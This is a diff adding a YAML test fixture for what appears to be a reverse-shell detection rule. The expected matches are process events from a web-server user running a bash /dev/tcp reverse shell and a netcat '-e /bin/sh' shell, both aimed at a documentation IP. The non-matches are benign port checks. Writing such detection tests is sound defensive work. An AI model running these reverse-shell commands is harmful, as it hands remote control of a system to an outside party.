@@ -1,0 +1,22 @@
+match:
+  - desc: bash -i >& /dev/tcp/HOST/PORT 0>&1 spawned by a web server
+    events:
+      - name: CreateProcess
+        platform: linux
+        proc: {pid: 24101, ppid: 24090, exe: /usr/bin/bash, name: bash, username: www-data, cmdline: 'bash -c bash -i >& /dev/tcp/198.51.100.20/4444 0>&1', args: [bash, -c, bash, -i, '>&', /dev/tcp/198.51.100.20/4444, '0>&1'], uid: -1, euid: -1}
+  - desc: netcat runs a shell
+    events:
+      - name: CreateProcess
+        platform: linux
+        proc: {pid: 24102, ppid: 24090, exe: /usr/bin/nc.traditional, name: nc.traditional, username: www-data, cmdline: 'nc.traditional -e /bin/sh 198.51.100.20 4444', args: [nc.traditional, -e, /bin/sh, 198.51.100.20, '4444'], uid: -1, euid: -1}
+nomatch:
+  - desc: benign lookalike - a script checks whether a port is open with /dev/tcp
+    events:
+      - name: CreateProcess
+        platform: linux
+        proc: {pid: 24110, ppid: 24090, exe: /usr/bin/bash, name: bash, username: root, cmdline: 'bash -c echo > /dev/tcp/db.internal/5432', args: [bash, -c, echo, '>', /dev/tcp/db.internal/5432], uid: -1, euid: -1}
+  - desc: netcat used as a port scanner
+    events:
+      - name: CreateProcess
+        platform: linux
+        proc: {pid: 24111, ppid: 24090, exe: /usr/bin/nc, name: nc, username: root, cmdline: 'nc -zv db.internal 5432', args: [nc, -zv, db.internal, '5432'], uid: -1, euid: -1}
